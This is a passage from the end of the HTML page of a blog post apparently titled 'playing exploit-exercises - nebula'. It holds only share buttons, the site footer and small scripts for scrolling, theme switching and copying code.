<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on whatsapp" href="https://api.whatsapp.com/send?text=playing%20exploit-exercises%20-%20nebula%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on telegram" href="https://telegram.me/share/url?text=playing%20exploit-exercises%20-%20nebula&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>